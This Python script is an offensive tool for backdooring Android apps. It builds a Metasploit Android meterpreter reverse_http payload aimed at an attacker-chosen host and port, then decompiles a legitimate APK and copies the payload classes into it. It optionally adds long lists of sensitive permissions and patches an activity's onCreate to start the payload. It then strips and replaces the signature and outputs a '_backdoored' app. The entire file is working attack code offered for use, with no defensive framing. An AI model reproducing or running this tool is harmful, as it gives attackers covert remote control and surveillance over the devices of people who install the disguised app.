import os
import re


apk = str(input("Enter apk location: "))
LHOST = str(input("Enter LHOST: "))
LPORT = str(input("Enter LPORT: "))

print('\n')
os.makedirs('tmp')
print('\n')
os.chdir('tmp')
print('\n')
os.system('msfvenom -p android/meterpreter/reverse_http LHOST=' + LHOST + ' LPORT=' + LPORT + ' R > virus.apk')
print('\n')
os.system('apktool d virus.apk')
print('\n')
os.system('apktool -r d ' + apk)
os.system('apktool -o AndroidManifest d ' + apk)

targetApk0 = apk.split('/')
targetApk = targetApk0[len(targetApk0)-1].replace('.apk', '')
print('\n')
os.system('cp -f -r virus/smali/com/metasploit ' + targetApk + '/smali/com')
AndroidManifestFile = open('AndroidManifest' + '/AndroidManifest.xml', 'r')
AndroidManifest = AndroidManifestFile.read()
AndroidManifestFile.close()

values1 = """<uses-permission android:name="android.permission.ACCESS_CACHE_FILESYSTEM"/>
<uses-permission android:name="android.permission.ACCESS_CHECKIN_PROPERTIES"/>
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
<uses-permission android:name="android.permission.ACCESS_CONTENT_PROVIDERS_EXTERNALLY"/>
<uses-permission android:name="android.permission.ACCESS_DRM_CERTIFICATES"/>
<uses-permission android:name="android.permission.ACCESS_FM_RADIO"/>
<uses-permission android:name="android.permission.ACCESS_INPUT_FLINGER"/>
<uses-permission android:name="android.permission.ACCESS_KEYGUARD_SECURE_STORAGE"/>
<uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS"/>
<uses-permission android:name="android.permission.ACCESS_MTP"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_CONDITIONS"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
<uses-permission android:name="android.permission.ACCESS_NOTIFICATIONS"/>
<uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY"/>
<uses-permission android:name="android.permission.ACCESS_PDB_STATE"/>
<uses-permission android:name="android.permission.ACCESS_SURFACE_FLINGER"/>
<uses-permission android:name="android.permission.ACCESS_VOICE_INTERACTION_SERVICE"/>
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
<uses-permission android:name="android.permission.ACCESS_WIMAX_STATE"/>
<uses-permission android:name="android.permission.ACCOUNT_MANAGER"/>
<uses-permission android:name="android.permission.ADD_VOICEMAIL"/>
<uses-permission android:name="android.permission.ALLOW_ANY_CODEC_FOR_PLAYBACK"/>
<uses-permission android:name="android.permission.ASEC_ACCESS"/>
<uses-permission android:name="android.permission.ASEC_CREATE"/>
<uses-permission android:name="android.permission.ASEC_DESTROY"/>
<uses-permission android:name="android.permission.ASEC_MOUNT_UNMOUNT"/>
<uses-permission android:name="android.permission.ASEC_RENAME"/>
<uses-permission android:name="android.permission.BACKUP"/>
<uses-permission android:name="android.permission.BATTERY_STATS"/>
<uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
<uses-permission android:name="android.permission.BIND_APPWIDGET"/>
<uses-permission android:name="android.permission.BIND_CARRIER_MESSAGING_SERVICE"/>
<uses-permission android:name="android.permission.BIND_CARRIER_SERVICES"/>
<uses-permission android:name="android.permission.BIND_CHOOSER_TARGET_SERVICE"/>
<uses-permission android:name="android.permission.BIND_CONDITION_PROVIDER_SERVICE"/>
<uses-permission android:name="android.permission.BIND_CONNECTION_SERVICE"/>
<uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"/>
<uses-permission android:name="android.permission.BIND_DIRECTORY_SEARCH"/>
<uses-permission android:name="android.permission.BIND_DREAM_SERVICE"/>
<uses-permission android:name="android.permission.BIND_INPUT_METHOD"/>
<uses-permission android:name="android.permission.BIND_INTENT_FILTER_VERIFIER"/>
<uses-permission android:name="android.permission.BIND_JOB_SERVICE"/>
<uses-permission android:name="android.permission.BIND_KEYGUARD_APPWIDGET"/>
<uses-permission android:name="android.permission.BIND_MIDI_DEVICE_SERVICE"/>
<uses-permission android:name="android.permission.BIND_NFC_SERVICE"/>
<uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"/>
<uses-permission android:name="android.permission.BIND_PACKAGE_VERIFIER"/>
<uses-permission android:name="android.permission.BIND_PRINT_SERVICE"/>
<uses-permission android:name="android.permission.BIND_PRINT_SPOOLER_SERVICE"/>
<uses-permission android:name="android.permission.BIND_REMOTEVIEWS"/>
<uses-permission android:name="android.permission.BIND_REMOTE_DISPLAY"/>
<uses-permission android:name="android.permission.BIND_ROUTE_PROVIDER"/>
<uses-permission android:name="android.permission.BIND_TELECOM_CONNECTION_SERVICE"/>
<uses-permission android:name="android.permission.BIND_TEXT_SERVICE"/>
<uses-permission android:name="android.permission.BIND_TRUST_AGENT"/>
<uses-permission android:name="android.permission.BIND_TV_INPUT"/>
<uses-permission android:name="android.permission.BIND_VOICE_INTERACTION"/>
<uses-permission android:name="android.permission.BIND_VPN_SERVICE"/>
<uses-permission android:name="android.permission.BIND_WALLPAPER"/>
<uses-permission android:name="android.permission.BLUETOOTH"/>
<uses-permission android:name="android.permission.BLUETOOTH_ADMIN"/>
<uses-permission android:name="android.permission.BLUETOOTH_MAP"/>
<uses-permission android:name="android.permission.BLUETOOTH_PRIVILEGED"/>
<uses-permission android:name="android.permission.BLUETOOTH_STACK"/>
<uses-permission android:name="android.permission.BRICK"/>
<uses-permission android:name="android.permission.BROADCAST_NETWORK_PRIVILEGED"/>
<uses-permission android:name="android.permission.BROADCAST_PACKAGE_REMOVED"/>
<uses-permission android:name="android.permission.BROADCAST_STICKY"/>
<uses-permission android:name="android.permission.C2D_MESSAGE"/>
<uses-permission android:name="android.permission.CAMERA"/>
<uses-permission android:name="android.permission.CAMERA_DISABLE_TRANSMIT_LED"/>
<uses-permission android:name="android.permission.CAMERA_SEND_SYSTEM_EVENTS"/>
<uses-permission android:name="android.permission.CAPTURE_AUDIO_HOTWORD"/>
<uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT"/>
<uses-permission android:name="android.permission.CAPTURE_SECURE_VIDEO_OUTPUT"/>
<uses-permission android:name="android.permission.CAPTURE_TV_INPUT"/>
<uses-permission android:name="android.permission.CAPTURE_VIDEO_OUTPUT"/>
<uses-permission android:name="android.permission.CHANGE_APP_IDLE_STATE"/>
<uses-permission android:name="android.permission.CHANGE_BACKGROUND_DATA_SETTING"/>
<uses-permission android:name="android.permission.CHANGE_COMPONENT_ENABLED_STATE"/>
<uses-permission android:name="android.permission.CHANGE_CONFIGURATION"/>
<uses-permission android:name="android.permission.CHANGE_DEVICE_IDLE_TEMP_WHITELIST"/>
<uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
<uses-permission android:name="android.permission.CHANGE_WIFI_MULTICAST_STATE"/>
<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
<uses-permission android:name="android.permission.CHANGE_WIMAX_STATE"/>
<uses-permission android:name="android.permission.CLEAR_APP_CACHE"/>
<uses-permission android:name="android.permission.CLEAR_APP_USER_DATA"/>
<uses-permission android:name="android.permission.CONFIGURE_WIFI_DISPLAY"/>
<uses-permission android:name="android.permission.CONFIRM_FULL_BACKUP"/>
<uses-permission android:name="android.permission.CONNECTIVITY_INTERNAL"/>
<uses-permission android:name="android.permission.CONTROL_KEYGUARD"/>
<uses-permission android:name="android.permission.CONTROL_LOCATION_UPDATES"/>
<uses-permission android:name="android.permission.CONTROL_VPN"/>
<uses-permission android:name="android.permission.CONTROL_WIFI_DISPLAY"/>
<uses-permission android:name="android.permission.COPY_PROTECTED_DATA"/>
<uses-permission android:name="android.permission.CRYPT_KEEPER"/>
<uses-permission android:name="android.permission.DELETE_CACHE_FILES"/>
<uses-permission android:name="android.permission.DELETE_PACKAGES"/>
<uses-permission android:name="android.permission.DEVICE_POWER"/>
<uses-permission android:name="android.permission.DIAGNOSTIC"/>
<uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
<uses-permission android:name="android.permission.DISPATCH_NFC_MESSAGE"/>
<uses-permission android:name="android.permission.DUMP"/>
<uses-permission android:name="android.permission.DVB_DEVICE"/>
<uses-permission android:name="android.permission.EXPAND_STATUS_BAR"/>
<uses-permission android:name="android.permission.FACTORY_TEST"/>
<uses-permission android:name="android.permission.FILTER_EVENTS"/>
<uses-permission android:name="android.permission.FLASHLIGHT"/>
<uses-permission android:name="android.permission.FORCE_BACK"/>
<uses-permission android:name="android.permission.FORCE_STOP_PACKAGES"/>
<uses-permission android:name="android.permission.FRAME_STATS"/>
<uses-permission android:name="android.permission.FREEZE_SCREEN"/>
<uses-permission android:name="android.permission.GET_APP_OPS_STATS"/>
<uses-permission android:name="android.permission.GET_DETAILED_TASKS"/>
<uses-permission android:name="android.permission.GET_PACKAGE_IMPORTANCE"/>
<uses-permission android:name="android.permission.GET_PACKAGE_SIZE"/>
<uses-permission android:name="android.permission.GET_TASKS"/>
<uses-permission android:name="android.permission.GET_TOP_ACTIVITY_INFO"/>
<uses-permission android:name="android.permission.GLOBAL_SEARCH"/>
<uses-permission android:name="android.permission.GLOBAL_SEARCH_CONTROL"/>
<uses-permission android:name="android.permission.GRANT_RUNTIME_PERMISSIONS"/>
<uses-permission android:name="android.permission.HARDWARE_TEST"/>
<uses-permission android:name="android.permission.HDMI_CEC"/>
<uses-permission android:name="android.permission.INJECT_EVENTS"/>
<uses-permission android:name="android.permission.INSTALL_GRANT_RUNTIME_PERMISSIONS"/>
<uses-permission android:name="android.permission.INSTALL_LOCATION_PROVIDER"/>
<uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
<uses-permission android:name="android.permission.INSTALL_SHORTCUT"/>
<uses-permission android:name="android.permission.INTENT_FILTER_VERIFICATION_AGENT"/>
<uses-permission android:name="android.permission.INTERACT_ACROSS_USERS"/>
<uses-permission android:name="android.permission.INTERACT_ACROSS_USERS_FULL"/>
<uses-permission android:name="android.permission.INTERNAL_SYSTEM_WINDOW"/>
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.INVOKE_CARRIER_SETUP"/>
<uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
<uses-permission android:name="android.permission.KILL_UID"/>
<uses-permission android:name="android.permission.LAUNCH_TRUST_AGENT_SETTINGS"/>
<uses-permission android:name="android.permission.LOCAL_MAC_ADDRESS"/>
<uses-permission android:name="android.permission.LOCATION_HARDWARE"/>
<uses-permission android:name="android.permission.LOOP_RADIO"/>
<uses-permission android:name="android.permission.MANAGE_ACTIVITY_STACKS"/>
<uses-permission android:name="android.permission.MANAGE_APP_TOKENS"/>
<uses-permission android:name="android.permission.MANAGE_CA_CERTIFICATES"/>
<uses-permission android:name="android.permission.MANAGE_DEVICE_ADMINS"/>
<uses-permission android:name="android.permission.MANAGE_DOCUMENTS"/>
<uses-permission android:name="android.permission.MANAGE_FINGERPRINT"/>
<uses-permission android:name="android.permission.MANAGE_MEDIA_PROJECTION"/>
<uses-permission android:name="android.permission.MANAGE_NETWORK_POLICY"/>
<uses-permission android:name="android.permission.MANAGE_PROFILE_AND_DEVICE_OWNERS"/>
<uses-permission android:name="android.permission.MANAGE_USB"/>
<uses-permission android:name="android.permission.MANAGE_USERS"/>
<uses-permission android:name="android.permission.MANAGE_VOICE_KEYPHRASES"/>
<uses-permission android:name="android.permission.MASTER_CLEAR"/>
<uses-permission android:name="android.permission.MEDIA_CONTENT_CONTROL"/>
<uses-permission android:name="android.permission.MODIFY_APPWIDGET_BIND_PERMISSIONS"/>
<uses-permission android:name="android.permission.MODIFY_AUDIO_ROUTING"/>
<uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
<uses-permission android:name="android.permission.MODIFY_NETWORK_ACCOUNTING"/>
<uses-permission android:name="android.permission.MODIFY_PARENTAL_CONTROLS"/>
<uses-permission android:name="android.permission.MODIFY_PHONE_STATE"/>
<uses-permission android:name="android.permission.MOUNT_FORMAT_FILESYSTEMS"/>
<uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
<uses-permission android:name="android.permission.MOVE_PACKAGE"/>
<uses-permission android:name="android.permission.NET_ADMIN"/>
<uses-permission android:name="android.permission.NET_TUNNELING"/>
<uses-permission android:name="android.permission.NFC"/>
<uses-permission android:name="android.permission.NFC_HANDOVER_STATUS"/>
<uses-permission android:name="android.permission.NOTIFY_PENDING_SYSTEM_UPDATE"/>
<uses-permission android:name="android.permission.OBSERVE_GRANT_REVOKE_PERMISSIONS"/>
<uses-permission android:name="android.permission.OEM_UNLOCK_STATE"/>
<uses-permission android:name="android.permission.OVERRIDE_WIFI_CONFIG"/>
<uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"/>
<uses-permission android:name="android.permission.PACKAGE_VERIFICATION_AGENT"/>
<uses-permission android:name="android.permission.PEERS_MAC_ADDRESS"/>
<uses-permission android:name="android.permission.PERFORM_CDMA_PROVISIONING"/>
<uses-permission android:name="android.permission.PERFORM_SIM_ACTIVATION"/>
<uses-permission android:name="android.permission.PERSISTENT_ACTIVITY"/>
<uses-permission android:name="android.permission.PROVIDE_TRUST_AGENT"/>
<uses-permission android:name="android.permission.QUERY_DO_NOT_ASK_CREDENTIALS_ON_BOOT"/>
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_DREAM_STATE"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_FRAME_BUFFER"/>
<uses-permission android:name="android.permission.READ_INPUT_STATE"/>
<uses-permission android:name="android.permission.READ_INSTALL_SESSIONS"/>
<uses-permission android:name="android.permission.READ_LOGS"/>
<uses-permission android:name="android.permission.READ_NETWORK_USAGE_HISTORY"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<uses-permission android:name="android.permission.READ_PRECISE_PHONE_STATE"/>
<uses-permission android:name="android.permission.READ_PRIVILEGED_PHONE_STATE"/>
<uses-permission android:name="android.permission.READ_PROFILE"/>
<uses-permission android:name="android.permission.READ_SEARCH_INDEXABLES"/>
<uses-permission android:name="android.permission.READ_SOCIAL_STREAM"/>
<uses-permission android:name="android.permission.READ_SYNC_SETTINGS"/>
<uses-permission android:name="android.permission.READ_SYNC_STATS"/>
<uses-permission android:name="android.permission.READ_USER_DICTIONARY"/>
<uses-permission android:name="android.permission.READ_VOICEMAIL"/>
<uses-permission android:name="android.permission.READ_WIFI_CREDENTIAL"/>
<uses-permission android:name="android.permission.REAL_GET_TASKS"/>
<uses-permission android:name="android.permission.REBOOT"/>
<uses-permission android:name="android.permission.RECEIVE_BLUETOOTH_MAP"/>
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
<uses-permission android:name="android.permission.RECEIVE_DATA_ACTIVITY_CHANGE"/>
<uses-permission android:name="android.permission.RECEIVE_EMERGENCY_BROADCAST"/>
<uses-permission android:name="android.permission.RECEIVE_STK_COMMANDS"/>
<uses-permission android:name="android.permission.RECEIVE_WIFI_CREDENTIAL_CHANGE"/>
<uses-permission android:name="android.permission.RECORD_AUDIO"/>
<uses-permission android:name="android.permission.RECOVERY"/>
<uses-permission android:name="android.permission.REGISTER_CONNECTION_MANAGER"/>
<uses-permission android:name="android.permission.REGISTER_SIM_SUBSCRIPTION"/>
<uses-permission android:name="android.permission.REMOTE_AUDIO_PLAYBACK"/>
<uses-permission android:name="android.permission.REMOVE_DRM_CERTIFICATES"/>
<uses-permission android:name="android.permission.REMOVE_TASKS"/>
<uses-permission android:name="android.permission.REORDER_TASKS"/>
<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
<uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
<uses-permission android:name="android.permission.RESTART_PACKAGES"/>
<uses-permission android:name="android.permission.RETRIEVE_WINDOW_CONTENT"/>
<uses-permission android:name="android.permission.RETRIEVE_WINDOW_TOKEN"/>
<uses-permission android:name="android.permission.REVOKE_RUNTIME_PERMISSIONS"/>
<uses-permission android:name="android.permission.SCORE_NETWORKS"/>
<uses-permission android:name="android.permission.SEND_RESPOND_VIA_MESSAGE"/>
<uses-permission android:name="android.permission.SERIAL_PORT"/>
<uses-permission android:name="android.permission.SET_ACTIVITY_WATCHER"/>
<uses-permission android:name="android.permission.SET_ALARM"/>
<uses-permission android:name="android.permission.SET_ALWAYS_FINISH"/>
<uses-permission android:name="android.permission.SET_ANIMATION_SCALE"/>
<uses-permission android:name="android.permission.SET_DEBUG_APP"/>
<uses-permission android:name="android.permission.SET_INPUT_CALIBRATION"/>
<uses-permission android:name="android.permission.SET_KEYBOARD_LAYOUT"/>
<uses-permission android:name="android.permission.SET_ORIENTATION"/>
<uses-permission android:name="android.permission.SET_POINTER_SPEED"/>
<uses-permission android:name="android.permission.SET_PREFERRED_APPLICATIONS"/>
<uses-permission android:name="android.permission.SET_PROCESS_LIMIT"/>
<uses-permission android:name="android.permission.SET_SCREEN_COMPATIBILITY"/>
<uses-permission android:name="android.permission.SET_TIME"/>
<uses-permission android:name="android.permission.SET_TIME_ZONE"/>
<uses-permission android:name="android.permission.SET_WALLPAPER"/>
<uses-permission android:name="android.permission.SET_WALLPAPER_COMPONENT"/>
<uses-permission android:name="android.permission.SET_WALLPAPER_HINTS"/>
<uses-permission android:name="android.permission.SHUTDOWN"/>
<uses-permission android:name="android.permission.SIGNAL_PERSISTENT_PROCESSES"/>
<uses-permission android:name="android.permission.START_ANY_ACTIVITY"/>
<uses-permission android:name="android.permission.START_TASKS_FROM_RECENTS"/>
<uses-permission android:name="android.permission.STATUS_BAR"/>
<uses-permission android:name="android.permission.STATUS_BAR_SERVICE"/>
<uses-permission android:name="android.permission.STOP_APP_SWITCHES"/>
<uses-permission android:name="android.permission.TEMPORARY_ENABLE_ACCESSIBILITY"/>
<uses-permission android:name="android.permission.TRANSMIT_IR"/>
<uses-permission android:name="android.permission.TRUST_LISTENER"/>
<uses-permission android:name="android.permission.TV_INPUT_HARDWARE"/>
<uses-permission android:name="android.permission.UNINSTALL_SHORTCUT"/>
<uses-permission android:name="android.permission.UPDATE_APP_OPS_STATS"/>
<uses-permission android:name="android.permission.UPDATE_CONFIG"/>
<uses-permission android:name="android.permission.UPDATE_DEVICE_STATS"/>
<uses-permission android:name="android.permission.UPDATE_LOCK"/>
<uses-permission android:name="android.permission.USER_ACTIVITY"/>
<uses-permission android:name="android.permission.USE_FINGERPRINT"/>
<uses-permission android:name="android.permission.VIBRATE"/>
<uses-permission android:name="android.permission.WAKE_LOCK"/>
<uses-permission android:name="MANAGE_OWN_CALLS"/>
<uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
<uses-permission android:name="android.permission.WRITE_DREAM_STATE"/>"""
values2 = """
    <uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.BLUETOOTH"/>
    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN"/>
    <uses-permission android:name="android.permission.BROADCAST_STICKY"/>
    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_MULTICAST_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
    <uses-permission android:name="android.permission.EXPAND_STATUS_BAR"/>
    <uses-permission android:name="android.permission.GET_PACKAGE_SIZE"/>
    <uses-permission android:name="android.permission.INSTALL_SHORTCUT"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="KILL_BACKGROUND_PROCESSES"/>
    <uses-permission android:name="MANAGE_OWN_CALLS"/>
    <uses-permission android:name="MODIFY_AUDIO_SETTINGS"/>
    <uses-permission android:name="NFC"/>
    <uses-permission android:name="READ_SYNC_STATS"/>
    <uses-permission android:name="RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="REORDER_TASKS"/>
    <uses-permission android:name="REQUEST_COMPANION_RUN_IN_BACKGROUND"/>
    <uses-permission android:name="REQUEST_COMPANION_USE_DATA_IN_BACKGROUND"/>
    <uses-permission android:name="REQUEST_DELETE_PACKAGES"/>
    <uses-permission android:name="REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="REQUEST_INSTALL_PACKAGES"/>
    <uses-permission android:name="SET_ALARM"/>
    <uses-permission android:name="SET_WALLPAPER"/>
    <uses-permission android:name="SET_WALLPAPER_HINTS"/>
    <uses-permission android:name="TRANSMIT_IR"/>
    <uses-permission android:name="USE_FINGERPRINT"/>
    <uses-permission android:name="VIBRATE"/>
    <uses-permission android:name="WAKE_LOCK"/>
    <uses-permission android:name="WRITE_SYNC_SETTINGS"/>
    """


def modify_manifest(file_name, value):
    f = open(file_name, 'r+')
    content = f.read()
    pattern = r'<uses-permission android:name=\".*\/>'
    extracts = re.findall(pattern, content)
    f.seek(0)
    f.truncate()
    if len(extracts) > 0:
        if value == 1:
            extract = extracts[len(extracts)-1]
            values = values1
            modified_content = content.replace(extract, extract + '\n    ' + values)
            f.write(modified_content)
            f.close()
        else:
            extract = extracts[len(extracts) - 1]
            values = values2
            modified_content = content.replace(extract, extract + '\n    ' + values)
            f.write(modified_content)
            f.close()
    else:
        if value == 1:
            extract = '</manifest>'
            values = values1
            modified_content = content.replace(extract, values + '\n' + extract)
            f.write(modified_content)
            f.close()
        else:
            extract = '</manifest>'
            values = values2
            modified_content = content.replace(extract, values + '\n' + extract)
            f.write(modified_content)
            f.close()
    f.close()
    os.system('apktool -o AndroidManifest_' + targetApk + '.apk ' + 'b AndroidManifest')
    os.system('apktool -r d AndroidManifest_' + targetApk + '.apk')
    os.system('rm ' + targetApk + '/AndroidManifest.xml')
    os.system('cp ' + 'AndroidManifest_' + targetApk + '/AndroidManifest.xml ' + targetApk)


addp = input('Add additional permissions? (y/N) ')

if addp is 'y':
    permissionType = input('Add many permissions? (y/N) If no only basic permissions like Internet Access will be added ')
    print('\n')
    if permissionType is 'y':
        modify_manifest('AndroidManifest' + '/AndroidManifest.xml', 1)
    else:
        modify_manifest('AndroidManifest' + '/AndroidManifest.xml', 2)
else:
    pass


os.system('rm -r AndroidManifest')
os.system('rm AndroidManifest_' + targetApk + '.apk')
os.system('rm -r AndroidManifest_' + targetApk)

print('\n')


matches = re.findall(r'<a[activyplcon]*\s+.*\s*>', AndroidManifest)
packages = re.findall(r'package=\".*\"', AndroidManifest)

# delete_signing
os.chdir(targetApk + '/original')
os.system('rm -r META-INF')
os.chdir('..')
os.chdir('..')


def modify_file(file_name):
    f = open(file_name, 'r')
    content = f.read()
    extract = '>onCreate(Landroid/os/Bundle;)V'
    value = extract + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
    modified_content = content.replace(extract, value)
    f.close()
    f = open(file_name, 'w+')
    f.write(modified_content)
    f.close()


# main() extracts all activities from AndroidManifest.xml and adds the payload to the selected activity
def main():
    l = []
    activities = []

    for x in range(0, len(matches)):
        l.append(re.findall(r'android\s*:\s*name\s*=\s*"[\w.]+"', matches[x]))
        activities.append(str(l[x]).replace('[', '').replace(']', '').replace('\'', '').replace('android:name="', '\"').replace('\"', '').replace('android.intent.action.MAIN', ''))
        if x < 9:
            print('0' + str(x + 1) + ': ' + activities[x])
        else:
            print(str(x + 1) + ': ' + activities[x])

    if len(matches) > 1:
        activity = int(input('\nPick an Activity to inject the payload (Enter Number between 1 and ' + str(len(matches)) + ')\n'))
    elif len(matches) == 1:
        activity = 1
    else:
        print('Error App has no activities')

    try:
        modify_file(targetApk + '/smali/' + str(activities[activity-1]).replace('.', '/') + '.smali')
    except IOError:
        try:
            modify_file(targetApk + '/smali_classes1/' + str(activities[activity - 1]).replace('.', '/') + '.smali')
        except IOError:
            try:
                modify_file(targetApk + '/smali_classes2/' + str(activities[activity - 1]).replace('.', '/') + '.smali')
            except IOError:
                try:
                    modify_file(targetApk + '/smali_classes3/' + str(activities[activity - 1]).replace('.', '/') + '.smali')
                except IOError:
                    try:
                        modify_file(targetApk + '/smali_classes4/' + str(activities[activity - 1]).replace('.', '/') + '.smali')
                    except IOError:
                        try:
                            modify_file(targetApk + '/smali_classes5/' + str(activities[activity - 1]).replace('.', '/') + '.smali')
                        except IOError:
                            try:
                                modify_file(targetApk + '/smali_classes6/' + str(activities[activity - 1]).replace('.', '/') + '.smali')
                            except IOError:
                                try:
                                    modify_file(targetApk + '/smali_classes7/' + str(activities[activity - 1]).replace('.', '/') + '.smali')
                                except IOError:
                                    try:
                                        modify_file(targetApk + '/smali_classes8/' + str(activities[activity - 1]).replace('.','/') + '.smali')
                                    except IOError:
                                        try:
                                            modify_file(targetApk + '/smali_classes9/' + str(activities[activity - 1]).replace('.','/') + '.smali')
                                        except IOError:
                                            try:
                                                modify_file(targetApk + '/smali_classes10/' + str(activities[activity - 1]).replace('.', '/') + '.smali')
                                            except IOError:
                                                try:
                                                    package = str(packages).replace('[', '').replace(']', '').replace('\'', '').replace('\"', '').replace('package=', '').replace('.', '/')
                                                    modify_file(targetApk + '/smali/' + package + '' + str(activities[activity - 1]).replace('.', '/').replace('//', '/') + '.smali')
                                                except IOError:
                                                    main()


main()

print('\nBuilding apk...')
os.system('apktool b -o ' + targetApk + '_backdoored.apk ' + targetApk)


os.system('mv ' + targetApk + '_backdoored.apk' + ' ..')
os.chdir('..')
os.system('rm -r tmp')

sign = str(input('\nDo you want to sign the apk? (y/N) '))

if sign == 'y':
    os.system('keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000')
    os.system('jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore ' + targetApk + '_backdoored' + '.apk alias_name')
    os.system('rm my-release-key.keystore')
    os.system('mv ' + targetApk + '_backdoored.apk ' + targetApk + '_backdoored_signed.apk')
    print('\napk saved in: ' + os.getcwd() + '/' + targetApk + '_backdoored_signed.apk')
elif sign == 'n':
    print('\napk saved in: ' + os.getcwd() + '/' + targetApk + '_backdoored.apk')
